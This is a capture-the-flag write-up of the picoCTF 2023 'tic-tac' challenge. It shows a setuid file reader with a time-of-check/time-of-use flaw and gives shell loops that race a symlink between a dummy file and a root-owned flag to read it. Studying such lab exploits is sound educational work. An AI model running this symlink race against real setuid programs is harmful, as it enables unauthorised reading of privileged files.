# Binary Exploitation / tic-tac

This is a write-up of my solution to these challenges from the [2023 picoCTF](/posts/2023_picoctf):

- Binary Exploitation / [tic-tac](https://play.picoctf.org/practice/challenge/380) (200 Points)

# tic-tac (200)
> Someone created a program to read text files; we think the program reads files with root privileges but apparently it only accepts to read files that are owned by the user running it.

On launching the challenge instance, we get `ssh`-connection details.
In the home-folder of our user `ctf-player`, we find the `txtreader` executable,
which is owned by `root` and has the [sticky bit](https://en.wikipedia.org/wiki/Sticky_bit) set:
```
$ ls -la
[...]
-rw------- 1 root       root          32 Mar 16 02:28 flag.txt
-rw-r--r-- 1 ctf-player ctf-player   912 Mar 16 01:30 src.cpp
-rwsr-xr-x 1 root       root       19016 Mar 16 02:28 txtreader
```

We can therefore execute it as `root` and it will print our own file `src.cpp` like `cat` would.
This does not work with `flag.txt` however,
since the binary seems to check the owner rights of files before it prints them:
```
$ ./txtreader src.cpp 
#include <iostream>
#include <fstream>
[...]

$ ./txtreader flag.txt 
Error: you don't own this file
```

The file `src.cpp` actually contains the source code of `txtreader`,
allowing us to look closer at how this check is performed:

```cpp
#include <iostream>
#include <fstream>
#include <unistd.h>
#include <sys/stat.h>

int main(int argc, char *argv[]) {
  if (argc != 2) {
    std::cerr << "Usage: " << argv[0] << " <filename>" << std::endl;
    return 1;
  }

  std::string filename = argv[1];
  std::ifstream file(filename);
  struct stat statbuf;

  // Check the file's status information.
  if (stat(filename.c_str(), &statbuf) == -1) {
    std::cerr << "Error: Could not retrieve file information" << std::endl;
    return 1;
  }

  // Check the file's owner.
  if (statbuf.st_uid != getuid()) {
    std::cerr << "Error: you don't own this file" << std::endl;
    return 1;
  }

  // Read the contents of the file.
  if (file.is_open()) {
    std::string line;
    while (getline(file, line)) {
      std::cout << line << std::endl;
    }
  } else {
    std::cerr << "Error: Could not open file" << std::endl;
    return 1;
  }

  return 0;
}
```

A big hint to the solution is one of the challenges tags: `toctou`
This stands for [time of check / time of use](https://de.wikipedia.org/wiki/Time-of-Check-to-Time-of-Use-Problem),
a common problem, where the execution of some code depends on a check.
When there is a gap in time between the check and the dependent code,
another process could change the check condition in exactly this moment.

In the code above, the ownership of the file is checked before it is opened for reading.
If we manage to swap the file between these two operations,
the check might be performed on a different file that the one being read.
For this I create a dummy file that I own and a symbolic link to this file called `flag`:

```bash
echo "dummy file content" > dummy.txt
ln -s dummy.txt flag
```

I can now call the `txtreader` with this link and it will print my file:

```bash
$ ./txtreader flag
dummy file content
```

With a `while`-loop, I can change this link back and forth between `dummy.txt` and `flag.txt` as fast as possible.
I put this process in the background with `&`, so it keeps running:
```
$ while true; do ln -fs flag.txt flag; ln -fs dummy.txt flag; done &
[1] 61
```

Now all that's left to do is to try reading `flag` as often as possible
and filtering away all outputs that are not the flag:
```
$ while true; do ./txtreader flag; done 2>&1 | grep "picoCTF"
picoCTF{ToctoU_!s_3a5y_XXXXXXXX}
```
